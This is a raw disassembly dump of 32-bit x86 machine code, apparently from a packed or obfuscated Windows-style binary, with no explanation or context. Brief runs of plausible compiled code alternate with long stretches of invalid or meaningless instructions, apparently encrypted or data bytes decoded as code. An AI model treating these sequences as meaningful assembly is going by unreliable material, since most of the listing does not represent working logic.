  40bc12:	mov    ah,0x4a
  40bc14:	out    dx,eax
  40bc15:	out    dx,al
  40bc16:	sahf   
  40bc17:	pushf  
  40bc18:	je     0x40bc17
  40bc1a:	sub    ch,BYTE PTR [edi]
  40bc1c:	cmp    eax,0xf1cb2890
  40bc21:	clc    
  40bc22:	pop    edx
  40bc23:	sti    
  40bc24:	xchg   edi,eax
  40bc25:	lea    eax,[edx-0x17]
  40bc28:	mov    dl,0xf7
  40bc2a:	jns    0x40bbfc
  40bc2c:	imul   DWORD PTR [ebx+ebx*1-0x28]
  40bc30:	mov    al,ds:0xfc5b96fe
  40bc35:	pop    ds
  40bc36:	lods   eax,DWORD PTR ds:[esi]
  40bc37:	xor    BYTE PTR [ecx],bh
  40bc39:	ret    
  40bc3a:	pushf  
  40bc3b:	add    ch,dh
  40bc3d:	pusha  
  40bc3e:	dec    esi
  40bc3f:	je     0x40bbc6
  40bc41:	je     0x40bc64
  40bc43:	fcom   QWORD PTR [ecx+0xb39d88c]
  40bc49:	add    bh,bh
  40bc4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc4c:	ret    0x24d0
  40bc4f:	and    edx,edi
  40bc51:	loope  0x40bc2e
  40bc53:	xor    BYTE PTR [ecx+0x41edf60d],dh
  40bc59:	clc    
  40bc5a:	xor    eax,0x80009094
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	jno    0x40bcc4
  40bc97:	mov    esp,0x7efbc62e
  40bc9c:	jle    0x40bcd6
  40bc9e:	jl     0x40bd1e
  40bca0:	jle    0x40bcac
  40bca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bca3:	iret   
  40bca4:	icebp  
  40bca5:	pop    edi
  40bca6:	ins    DWORD PTR es:[edi],dx
  40bca7:	mov    al,0x8d
  40bca9:	mov    bl,0xfc
  40bcab:	stos   DWORD PTR es:[edi],eax
  40bcac:	gs pushf 
  40bcae:	(bad)  
  40bcaf:	repz adc al,0x65
  40bcb2:	fistp  DWORD PTR [edx-0x17fcf788]
  40bcb8:	pop    ss
  40bcb9:	xor    eax,0x14daefc4
  40bcbe:	mov    bh,0xf0
  40bcc0:	fimul  DWORD PTR [ecx]
  40bcc2:	enter  0xf3e3,0xe3
  40bcc6:	jne    0x40bd21
  40bcc8:	inc    ecx
  40bcc9:	pop    ds
  40bcca:	stos   DWORD PTR es:[edi],eax
  40bccb:	inc    ecx
  40bccc:	jbe    0x40bc9f
  40bcce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bccf:	mov    ebp,0x47af571e
  40bcd4:	test   al,0xa1
  40bcd6:	push   esi
  40bcd7:	cmp    al,0x2d
  40bcd9:	xchg   DWORD PTR [ebp+edi*1+0x2c],edx
  40bcdd:	mov    WORD PTR [edx+0x19],?
  40bce0:	xchg   ebx,eax
  40bce1:	not    DWORD PTR [edi-0xb]
  40bce4:	test   al,0x6
  40bce6:	jle    0x40bca0
  40bce8:	in     eax,0x6
  40bcea:	add    ebx,esi
  40bcec:	into   
  40bced:	ins    DWORD PTR es:[edi],dx
  40bcee:	dec    esi
  40bcef:	push   esi
  40bcf0:	ins    BYTE PTR es:[edi],dx
  40bcf1:	mov    edi,0x84f82598
  40bcf6:	adc    eax,0x20e3981b
  40bcfb:	fdivr  st,st(3)
  40bcfd:	popf   
  40bcfe:	clc    
  40bcff:	ins    BYTE PTR es:[edi],dx
  40bd00:	xchg   edi,eax
  40bd01:	cmc    
  40bd02:	push   es
  40bd03:	jmp    0xf3a5:0x6dfc24a7
  40bd0a:	xor    bl,bh
  40bd0c:	sub    edi,ebp
  40bd0e:	sub    BYTE PTR [eax],al
  40bd10:	push   cs
  40bd11:	(bad)  
  40bd13:	adc    edi,esi
  40bd15:	aad    0xb5
  40bd17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd18:	or     al,0x8e
  40bd1a:	inc    esi
  40bd1b:	push   0x7af8de60
  40bd20:	add    BYTE PTR [esp+ebx*2+0x7f],0xac
  40bd25:	cwde   
  40bd26:	ins    DWORD PTR es:[edi],dx
  40bd27:	dec    ebx
  40bd28:	ret    0xec62
  40bd2b:	in     al,0x67
  40bd2d:	ins    DWORD PTR es:[edi],dx
  40bd2e:	out    dx,eax
  40bd2f:	rol    BYTE PTR [ebx],0x2b
  40bd32:	cdq    
  40bd33:	jmp    0x31864964
  40bd38:	jp     0x40bd61
  40bd3a:	ss dec esi
  40bd3c:	add    al,0xbf
  40bd3e:	lahf   
  40bd3f:	imul   BYTE PTR [eax+eax*2-0x7c]
  40bd43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd44:	sub    al,0x2b
  40bd46:	sub    DWORD PTR [esi],esi
  40bd48:	imul   edx,DWORD PTR es:[eax],0xffffff95
  40bd4c:	mov    ch,0x7f
  40bd4e:	icebp  
  40bd4f:	imul   ecx,DWORD PTR [edx-0x1f],0xce58bffe
  40bd56:	pop    esi
  40bd57:	mov    ecx,0xcc9cc5a2
  40bd5c:	push   0xffffffa1
  40bd5e:	pop    ds
  40bd5f:	repnz enter 0xa454,0x94
  40bd64:	inc    ebx
  40bd65:	mov    dl,0x34
  40bd67:	(bad)  
  40bd68:	pop    edx
  40bd69:	loop   0x40bde1
  40bd6b:	(bad)  
  40bd6c:	pop    ecx
  40bd6d:	or     DWORD PTR [edx+eax*2+0x40],ebp
  40bd71:	jl     0x40bcfd
  40bd73:	es push 0xca951d21
  40bd79:	dec    esi
  40bd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd7b:	cwde   
  40bd7c:	dec    ecx
  40bd7d:	repnz repnz fistp DWORD PTR ds:[eax-0xdfb5489]
  40bd86:	mov    bh,0x28
  40bd88:	loope  0x40bd38
  40bd8a:	arpl   WORD PTR [edi+edi*4-0x6509fcf4],cx
  40bd91:	jnp    0x40be0e
  40bd93:	ss pop edx
  40bd95:	mov    ebx,0x14e086a6
  40bd9a:	jl     0x40bd8b
  40bd9c:	fldcw  WORD PTR [eax]
  40bd9e:	xchg   edx,eax
  40bd9f:	jmp    FWORD PTR [edi-0x6d]
  40bda2:	fild   QWORD PTR [ebp+0x67]
  40bda5:	daa    
  40bda6:	div    DWORD PTR [esi-0x6c]
  40bda9:	push   ebp
  40bdaa:	pop    esp
  40bdab:	mov    edx,cs
  40bdad:	popa   
  40bdae:	sbb    al,0x9f
  40bdb0:	jmp    0x7aa7:0x8b95c304
  40bdb7:	retf   
  40bdb8:	(bad)  
  40bdb9:	fxam   
  40bdbb:	xchg   ebx,eax
  40bdbc:	pop    edi
  40bdbd:	out    dx,al
  40bdbe:	push   ebx
  40bdbf:	mov    bh,0x90
  40bdc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc2:	jl     0x40bdb6
  40bdc4:	jmp    0xeb30:0xeb21ae08
  40bdcb:	adc    BYTE PTR [edi+0x37],0x76
  40bdcf:	retf   0x4a38
  40bdd2:	and    eax,0x7f6cc15d
  40bdd7:	push   0x259c2a3b
  40bddc:	imul   edi,DWORD PTR [eax-0x7f829890],0xffffffee
  40bde3:	jne    0x40be1e
  40bde5:	retf   
  40bde6:	cmc    
  40bde7:	cld    
  40bde8:	out    0xfc,eax
  40bdea:	ins    DWORD PTR es:[edi],dx
  40bdeb:	mov    dh,0xa1
  40bded:	(bad)  
  40bdee:	pop    ds
  40bdef:	dec    esi
  40bdf0:	dec    edi
  40bdf1:	adc    al,ah
  40bdf3:	out    dx,eax
  40bdf4:	test   edx,ebp
  40bdf6:	push   edi
  40bdf7:	arpl   sp,dx
  40bdf9:	mov    DWORD PTR [edi],eax
  40bdfb:	cli    
  40bdfc:	data16 add bh,BYTE PTR [edi-0x3a6b7da6]
  40be03:	inc    ebx
  40be04:	fs cdq 
  40be06:	xchg   esi,eax
  40be07:	std    
  40be08:	dec    ecx
  40be09:	(bad)  
  40be0a:	fidivr WORD PTR [ebx-0x39ec6f33]
  40be10:	lock push 0x5a
  40be13:	dec    edx
  40be14:	mov    esp,0x6fa409db
  40be19:	cdq    
  40be1a:	jge    0x40be56
  40be1c:	cwde   
  40be1d:	popf   
  40be1e:	cmp    al,BYTE PTR [eax+edi*4]
  40be21:	ins    DWORD PTR es:[edi],dx
  40be22:	push   ebx
  40be23:	leave  
  40be24:	and    eax,0x75e7637
  40be29:	cwde   
  40be2a:	enter  0x5355,0x9d
  40be2e:	mov    bh,0x91
  40be30:	or     eax,0xc69244c1
  40be35:	lahf   
  40be36:	inc    edx
  40be37:	(bad)
  40be3a:	popf   
  40be3b:	mov    ebp,0x56dc2c4a
  40be40:	add    eax,0xb85a8f54
  40be45:	mov    ebp,0x8791f9a4
  40be4a:	add    dh,BYTE PTR [ecx-0x45df9fed]
  40be50:	pop    edx
  40be51:	fwait
  40be52:	scas   al,BYTE PTR es:[edi]
  40be53:	add    bh,BYTE PTR [ebx-0x35]
  40be56:	jg     0x40be11
  40be58:	pop    ecx
  40be59:	lds    ebx,FWORD PTR [ebp+0x128489cc]
  40be5f:	neg    DWORD PTR [edx+0x55]
  40be62:	pop    eax
  40be63:	daa    
  40be64:	test   DWORD PTR [ecx],0xeb154578
  40be6a:	je     0x40be64
  40be6c:	pop    edi
  40be6d:	ret    0x5af8
  40be70:	mov    bh,0x39
  40be72:	shr    DWORD PTR [ebx-0x714ef6f0],cl
  40be78:	call   0x89c7:0x98c7a7be
  40be7f:	mov    ds:0x681ac7aa,al
  40be84:	cli    
  40be85:	add    al,0x5c
  40be87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be88:	test   al,0x32
  40be8a:	mov    bh,0xde
  40be8c:	lock mov ecx,0xc9b7d8b1
  40be92:	mov    ecx,0x380b084b
  40be97:	in     eax,0xff
  40be99:	dec    esi
  40be9a:	and    eax,0x83502231
  40be9f:	fsub   QWORD PTR [edi+0x11]
  40bea2:	lea    ecx,[edi-0x181bc9c5]
  40bea8:	rol    BYTE PTR [ecx+0x11],0x53
  40beac:	rcl    BYTE PTR [esi],0xe5
  40beaf:	jl     0x40bef6
  40beb1:	pop    ebx
  40beb2:	or     esp,edi
  40beb4:	fmul   st(7),st
  40beb6:	outs   dx,BYTE PTR ds:[esi]
  40beb7:	mov    esp,0x17ce7cb6
  40bebc:	pop    ebx
  40bebe:	ins    BYTE PTR es:[edi],dx
  40bebf:	ja     0x40bf10
  40bec1:	cmp    BYTE PTR [ecx+eax*8+0x29],dh
  40bec5:	lds    ebx,FWORD PTR [ebx+ecx*2-0x4d]
  40bec9:	mov    edi,0xee32cb1d
  40bece:	call   0x305a:0x23ca91f8
  40bed5:	or     esp,DWORD PTR [ecx*4+0x633a0272]
  40bedc:	neg    DWORD PTR [ebx+0x79b03f66]
  40bee2:	inc    ebp
  40bee3:	cli    
  40bee4:	cmp    edx,DWORD PTR [ebx+0x85435f0]
  40beea:	push   ecx
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x849f5cf]
  40bf27:	jge    0x40bea9
  40bf29:	stc    
  40bf2a:	jle    0x40bfaa
  40bf2c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bf30:	xchg   ecx,eax
  40bf31:	push   ebx
  40bf32:	lahf   
  40bf33:	dec    ecx
  40bf34:	aad    0xaf
  40bf36:	aas    
  40bf37:	mov    bl,0x7a
  40bf39:	or     edx,0xffffffa7
  40bf3c:	add    eax,0x9e9ed6a4
  40bf41:	cs adc ebp,ecx
  40bf44:	sbb    DWORD PTR [ebx-0x7],ebx
  40bf47:	shl    DWORD PTR [esi+0x22d920ae],cl
  40bf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf4e:	pop    edi
  40bf4f:	or     ebp,DWORD PTR [edi-0x4]
  40bf52:	dec    eax
  40bf53:	stos   BYTE PTR es:[edi],al
  40bf54:	jg     0x40bfba
  40bf56:	ret    0xb4a6
  40bf59:	and    eax,ecx
  40bf5b:	scas   eax,DWORD PTR es:[edi]
  40bf5c:	cmc    
  40bf5d:	sbb    ch,BYTE PTR [ebx-0x288103a7]
  40bf63:	int    0xc6
  40bf65:	sub    al,dh
  40bf67:	outs   dx,BYTE PTR ds:[esi]
  40bf68:	leave  
  40bf69:	or     cl,BYTE PTR [ecx]
  40bf6b:	sub    BYTE PTR [edx-0x33],bh
  40bf6e:	and    BYTE PTR [edi+0x69d36210],dl
  40bf74:	jno    0x40bfa3
  40bf76:	cmp    BYTE PTR [esi],dl
  40bf78:	bound  eax,QWORD PTR [esi-0x5]
  40bf7b:	dec    ebp
  40bf7c:	outs   dx,DWORD PTR ds:[esi]
  40bf7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf7e:	leavew 
  40bf80:	jg     0x40bf96
  40bf82:	stc    
  40bf83:	inc    ebx
  40bf84:	test   DWORD PTR [esp+edi*8-0x4032b95f],esp
  40bf8b:	sbb    DWORD PTR [edi-0x73],eax
  40bf8e:	jae    0x40bf53
  40bf90:	adc    BYTE PTR [edi-0x35],ah
  40bf93:	push   ebx
  40bf94:	lds    edx,FWORD PTR [edx-0x5c]
  40bf97:	jbe    0x40bfcc
  40bf99:	adc    edi,ebx
  40bf9b:	popf   
  40bf9c:	scas   al,BYTE PTR es:[edi]
  40bf9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf9e:	pop    ds
  40bf9f:	iret   
  40bfa0:	scas   al,BYTE PTR es:[edi]
  40bfa1:	mov    edx,0xd35af3b3
  40bfa6:	(bad)  
  40bfa8:	mov    al,ds:0xbb03e336
  40bfad:	ror    DWORD PTR [edx],0x19
  40bfb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb1:	pop    ebx
  40bfb2:	stc    
  40bfb3:	xchg   ebp,eax
  40bfb4:	fsubr  QWORD PTR [ecx-0x5]
  40bfb7:	mov    DWORD PTR [esi+0x11d88ef],edx
  40bfbd:	shl    edi,1
  40bfbf:	nop
  40bfc0:	push   esp
  40bfc1:	add    al,0xaa
  40bfc3:	mov    ah,0xf3
  40bfc5:	addr16 pop esi
  40bfc7:	out    dx,eax
  40bfc8:	out    dx,al
  40bfc9:	or     eax,DWORD PTR [ebp+0x9d8fe6f]
  40bfcf:	jo     0x40c026
  40bfd1:	icebp  
  40bfd2:	vhsubps ymm5,ymm0,ymm7
  40bfd6:	mov    DWORD PTR [edi+0x22],eax
  40bfd9:	pop    edx
  40bfda:	xor    ebp,esi
  40bfdc:	repz push esi
  40bfde:	stc    
  40bfdf:	adc    bh,dh
  40bfe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfe2:	adc    al,0x17
  40bfe4:	and    eax,0x85c51ba2
  40bfe9:	mov    al,BYTE PTR [esi+0xef5c2a6]
  40bfef:	fcmovnb st,st(6)
  40bff1:	mov    DWORD PTR [edx+0x62],esp
  40bff4:	aas    
  40bff5:	dec    esp
  40bff6:	mov    ecx,0x16db452a
  40bffb:	imul   ebx,DWORD PTR [esp+eax*1],0xffffffb8
  40bfff:	pushf  
  40c000:	imul   ebx,DWORD PTR [ecx],0x14
  40c003:	add    eax,0xbbaa3445
  40c008:	ret    0xa48f
  40c00b:	ins    BYTE PTR es:[edi],dx
  40c00c:	inc    esi
  40c00d:	jge    0x40c054
  40c00f:	scas   eax,DWORD PTR es:[edi]
  40c010:	push   es
  40c011:	xlat   BYTE PTR ds:[ebx]
  40c012:	jb     0x40c053
  40c014:	mov    dh,0xbe
  40c016:	pop    edi
  40c017:	neg    BYTE PTR [eax+0x69]
  40c01a:	cmp    al,0x78
  40c01c:	pop    edi
  40c01d:	pop    ss
  40c01e:	jns    0x40bfbf
  40c020:	push   ss
  40c021:	call   0x10f566f6
  40c026:	jge    0x40c004
  40c028:	jg     0x40c005
  40c02a:	jmp    0x7c8b:0x5a59c4a1
  40c031:	jbe    0x40c03a
  40c033:	cmp    dh,BYTE PTR [edi-0x2361d990]
  40c039:	fnstsw WORD PTR [ecx+ecx*1]
  40c03c:	fdivr  st,st(2)
  40c03e:	cs pop edx
  40c040:	and    edx,DWORD PTR ds:0xd87fba1d
  40c046:	pop    es
  40c047:	xchg   BYTE PTR [ebp+0x5a],bl
  40c04a:	imul   esi,ebp,0xfffffff0
  40c04d:	popf   
  40c04e:	and    al,0x9d
  40c050:	sahf   
  40c051:	ficom  WORD PTR [eax]
  40c053:	fld    TBYTE PTR [ebp-0x26]
  40c056:	or     eax,0xf38cf268
  40c05b:	jmp    0x40c003
  40c05d:	adc    ch,BYTE PTR [esi-0x6c]
  40c060:	inc    ebp
  40c061:	push   eax
  40c062:	add    eax,0x9194fe07
  40c067:	loopne 0x40c0d5
  40c069:	and    bl,BYTE PTR [eax*4+0x356a243a]
  40c070:	mov    ch,0xe
  40c072:	out    0x6d,al
  40c074:	dec    ecx
  40c075:	and    BYTE PTR [esi-0x29],dl
  40c078:	inc    edx
  40c079:	mov    dh,0xdc
  40c07b:	daa    
  40c07c:	or     eax,0x16fdd641
  40c081:	push   ebx
  40c082:	cmp    ebx,eax
  40c084:	das    
  40c085:	xchg   ebp,eax
  40c087:	clc    
  40c088:	ror    ah,1
  40c08a:	fwait
  40c08b:	jo     0x40c0e7
  40c08d:	jle    0x40c0c9
  40c08f:	jb     0x40c0dd
  40c091:	pop    edx
  40c092:	dec    esp
  40c093:	das    
  40c094:	fwait
  40c095:	xchg   edx,eax
  40c096:	add    eax,0x41ad7c93
  40c09b:	fs pop ecx
  40c09d:	pop    ecx
  40c09e:	adc    DWORD PTR [edx],esp
  40c0a0:	dec    edx
  40c0a1:	cmc    
  40c0a2:	cdq    
  40c0a3:	xor    eax,0x5a5e904a
  40c0a8:	es mov cl,0xf3
  40c0ab:	or     DWORD PTR [eax+0xb],ebp
  40c0ae:	mov    edi,0xbe5ef89e
  40c0b3:	or     BYTE PTR [ebx-0x4a5d0ffe],cl
  40c0b9:	inc    ebx
  40c0ba:	nop
  40c0bb:	pop    edi
  40c0bc:	(bad)  
  40c0bd:	cmc    
  40c0be:	cdq    
  40c0bf:	jno    0x40c130
  40c0c1:	rcr    BYTE PTR ds:[ecx+0x4773a91c],cl
  40c0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0c9:	es lahf 
  40c0cb:	call   0x440f:0x35602019
  40c0d2:	push   esi
  40c0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d4:	cmp    DWORD PTR [edi+eiz*4-0x32],eax
  40c0d8:	xor    al,0x4f
  40c0da:	rcl    bl,0x30
  40c0dd:	or     eax,0x4a159e4d
  40c0e2:	mov    ebx,0xbbdac932
  40c0e7:	mov    esi,0xd15dd099
  40c0ec:	clc    
  40c0ed:	sub    dl,BYTE PTR [ebx+edx*8+0x479839b9]
  40c0f4:	test   esp,esi
  40c0f6:	xor    ebp,ebp
  40c0f8:	call   0x5951e00e
  40c0fd:	retf   
  40c0fe:	jle    0x40c16a
  40c100:	inc    edi
  40c101:	scas   eax,DWORD PTR es:[edi]
  40c102:	cmp    edx,DWORD PTR [ebp-0x1eda50f2]
  40c108:	push   0xfffffffb
  40c10a:	mov    edx,0x9fcc4595
  40c10f:	(bad)  
  40c110:	shl    BYTE PTR [esi],cl
  40c112:	jmp    FWORD PTR [ebx+eax*2-0x3c968c62]
  40c119:	aad    0x8e
  40c11b:	pop    ecx
  40c11c:	adc    eax,0x97515f2b
  40c121:	ror    BYTE PTR [ebp-0x10],cl
  40c124:	push   0xc36fb107
  40c129:	cwde   
  40c12a:	sbb    al,0x82
  40c12c:	(bad)  
  40c12d:	cmp    BYTE PTR [edx],cl
  40c12f:	xchg   edi,eax
  40c130:	mov    ch,0x6b
  40c132:	fisubr WORD PTR [esp+ebp*2+0x41]
  40c136:	adc    ebx,0xcd7fd537
  40c13c:	xchg   esp,eax
  40c13d:	mov    dh,0xe3
  40c13f:	mov    bl,0x9a
  40c141:	aam    0x9b
  40c143:	fldcw  WORD PTR [edi]
  40c145:	sar    ch,cl
  40c147:	pushf  
  40c148:	mov    ecx,fs
  40c14a:	mov    bh,bl
  40c14c:	scas   al,BYTE PTR es:[edi]
  40c14d:	push   esp
  40c14f:	mov    gs,WORD PTR cs:[esp+esi*2]
  40c153:	rcr    DWORD PTR [eax+eiz*8+0x7d2870c6],cl
  40c15a:	adc    ecx,esp
  40c15c:	mov    dh,0x25
  40c15e:	inc    esp
  40c15f:	or     ah,al
  40c161:	push   ebx
  40c162:	mov    ecx,0xac1fdf57
  40c167:	ds cld 
  40c169:	leave  
  40c16a:	pop    ds
  40c16b:	aam    0x28
  40c16d:	xchg   ebp,eax
  40c16e:	fadd   DWORD PTR [ebp+0x159347fb]
  40c174:	jp     0x40c1ba
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xe6
  40c196:	xchg   edi,eax
  40c197:	imul   esi,DWORD PTR [esi+0x4a],0xffffff87
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	push   0x548ced25
  40c1a6:	out    0x46,al
  40c1a8:	mov    ch,0x3b
  40c1aa:	fmul   DWORD PTR [edi-0x4c]
  40c1ad:	mov    ?,WORD PTR [edx]
  40c1af:	cmp    ebx,esi
  40c1b1:	pop    esp
  40c1b2:	pop    esi
  40c1b3:	or     esp,ecx
  40c1b5:	ror    ch,1
  40c1b7:	loop   0x40c184
  40c1b9:	clc    
  40c1ba:	mov    al,ds:0x5f8fda85
  40c1bf:	repnz mov ebp,0xe6cf130e
  40c1c5:	add    al,ah
  40c1c7:	(bad)  [edi+0x19]
  40c1ca:	add    eax,0xcca46e9
  40c1cf:	mov    bl,0xb3
  40c1d1:	les    ebx,FWORD PTR [esi+0x1a]
  40c1d4:	je     0x40c1fd
  40c1d6:	aaa    
  40c1d7:	retf   
  40c1d8:	pusha  
  40c1d9:	add    eax,0x25760169
  40c1de:	push   edx
  40c1df:	inc    edx
  40c1e0:	push   es
  40c1e1:	mov    dl,0x84
  40c1e3:	add    eax,0x8ca49c5a
  40c1e8:	lods   al,BYTE PTR ds:[esi]
  40c1e9:	in     al,0xef
  40c1eb:	sbb    esi,DWORD PTR [edi+edx*4]
  40c1ee:	jns    0x40c173
  40c1f0:	xchg   ebx,eax
  40c1f1:	aaa    
  40c1f2:	jmp    0x3349:0x9bf74bf4
  40c1f9:	sub    al,0x16
  40c1fb:	push   ds
  40c1fc:	lds    edx,FWORD PTR [ecx]
  40c1fe:	and    al,0xfa
  40c200:	clc    
  40c201:	ins    DWORD PTR es:[edi],dx
  40c202:	ins    BYTE PTR es:[edi],dx
  40c203:	stos   BYTE PTR es:[edi],al
  40c204:	in     eax,0x3d
  40c206:	push   es
  40c207:	jge    0x40c199
  40c209:	cmp    esp,esp
  40c20b:	or     DWORD PTR [ecx+0x3f],ebx
  40c20e:	fcom   QWORD PTR [esi]
  40c210:	sub    DWORD PTR [ebx+eax*8-0x1],ecx
  40c214:	inc    edx
  40c215:	xor    eax,0x29c8720d
  40c21a:	in     al,dx
  40c21b:	inc    esi
  40c21c:	push   edx
  40c21d:	imul   esi,DWORD PTR [ebx],0xb4869110
  40c223:	mov    ecx,0xf4182641
  40c228:	mov    cl,bl
  40c22a:	addr16 int3 
  40c22c:	cmp    eax,0xa5b3b49f
  40c231:	jmp    0xb827:0x55b447c2
  40c238:	mov    eax,DWORD PTR [edi-0xe60fc29]
  40c23e:	dec    ebx
  40c23f:	dec    ecx
  40c240:	aam    0xf
  40c242:	inc    ecx
  40c243:	div    BYTE PTR [ebp-0x2bb57be0]
  40c249:	push   ebx
  40c24a:	test   al,0x8c
  40c24c:	xor    eax,0x6edb79a6
  40c251:	pop    edi
  40c252:	and    DWORD PTR [edx-0x4df5e5c3],eax
  40c258:	imul   ecx,DWORD PTR [esp+esi*8-0x3d],0x66c7df0
  40c260:	add    eax,0xf592ae94
  40c265:	cmp    DWORD PTR [ecx],ebx
  40c267:	pop    ebp
  40c268:	dec    ebx
  40c269:	mov    al,0xde
  40c26b:	in     al,dx
  40c26c:	lods   al,BYTE PTR ds:[esi]
  40c26d:	inc    ebx
  40c26e:	push   eax
  40c26f:	sub    DWORD PTR [ecx],ecx
  40c271:	das    
  40c272:	cli    
  40c273:	in     eax,0xd7
  40c275:	add    cl,cl
  40c277:	sub    edx,DWORD PTR [ecx+ebx*1]
  40c27a:	xchg   DWORD PTR [esp+ebp*2+0x1a],edx
  40c27e:	daa    
  40c27f:	pop    edi
  40c280:	jmp    0x5dc5:0x9c77c989
  40c287:	mov    ch,0x24
  40c289:	ds xchg ebp,eax
  40c28b:	stos   DWORD PTR es:[edi],eax
  40c28c:	pop    es
  40c28d:	retf   0x5c01
  40c290:	fucom  st(7)
  40c292:	or     DWORD PTR [eax],edi
  40c294:	daa    
  40c295:	or     al,0xdf
  40c297:	pop    esi
  40c298:	jno    0x40c298
  40c29a:	ror    DWORD PTR [ebx+0x39f79109],1
  40c2a0:	test   BYTE PTR [edi+0x3f9be5ec],0x75
  40c2a7:	inc    ebx
  40c2a8:	(bad)  
  40c2a9:	fwait
  40c2aa:	xchg   BYTE PTR [esi],dh
  40c2ac:	pop    edx
  40c2ad:	into   
  40c2ae:	push   esp
  40c2af:	stos   DWORD PTR es:[edi],eax
  40c2b0:	inc    ebx
  40c2b1:	sub    BYTE PTR [edi+0x124a0507],0x4a
  40c2b8:	mov    edx,0x26fc42
  40c2bd:	mov    dh,BYTE PTR [ecx-0x3b]
  40c2c0:	inc    ebp
  40c2c1:	mov    ds:0x404cc152,eax
  40c2c6:	sub    eax,0x8ea7fc32
  40c2cb:	ror    ch,cl
  40c2cd:	mov    bh,0xa2
  40c2cf:	lahf   
  40c2d0:	clc    
  40c2d1:	repz jbe 0x40c32f
  40c2d4:	jns    0x40c32a
  40c2d6:	out    0x59,eax
  40c2d8:	push   edx
  40c2d9:	cs pop esp
  40c2db:	dec    ebp
  40c2dc:	inc    esp
  40c2dd:	aad    0xe2
  40c2df:	xor    DWORD PTR [ecx+0x65],esi
  40c2e2:	call   FWORD PTR [ebx+0x3]
  40c2e5:	jb     0x40c2fb
  40c2e7:	sub    DWORD PTR [esi+0x50b69f67],ebp
  40c2ed:	push   edx
  40c2ee:	int    0x7d
  40c2f0:	outs   dx,DWORD PTR ds:[esi]
  40c2f1:	sahf   
  40c2f2:	add    ebp,0x81d79292
  40c2f8:	je     0x40c2c8
  40c2fa:	inc    ebp
  40c2fb:	inc    esi
  40c2fc:	neg    BYTE PTR [esi+0x78]
  40c2ff:	sbb    bh,BYTE PTR [edi]
  40c301:	mov    eax,0x23b8b96e
  40c306:	xchg   ebx,eax
  40c307:	inc    ebp
  40c308:	xlat   BYTE PTR ds:[ebx]
  40c309:	sbb    BYTE PTR [ebp+0x75b03090],bl
  40c30f:	mov    bh,0x66
  40c311:	or     ebx,DWORD PTR [ecx-0x6aa9d65e]
  40c317:	jae    0x40c2fc
  40c319:	retf   0x76ab
  40c31c:	dec    esi
  40c31d:	mov    cl,al
  40c31f:	add    bh,ch
  40c321:	int    0x6c
  40c323:	repz inc esp
  40c325:	cmc    
  40c326:	das    
  40c327:	pop    eax
  40c328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c329:	xchg   ebx,eax
  40c32a:	rol    DWORD PTR [ebp+0x4],cl
  40c32d:	cmc    
  40c32e:	push   ebp
  40c32f:	icebp  
  40c330:	(bad)  
  40c331:	pop    eax
  40c332:	dec    edx
  40c333:	retf   
  40c334:	dec    ebx
  40c335:	lahf   
  40c336:	(bad)  
  40c337:	jbe    0x40c327
  40c339:	push   ebx
  40c33a:	xchg   esp,eax
  40c33b:	sahf   
  40c33c:	inc    esp
  40c33d:	lea    ebp,[ecx+0x5d17f6f8]
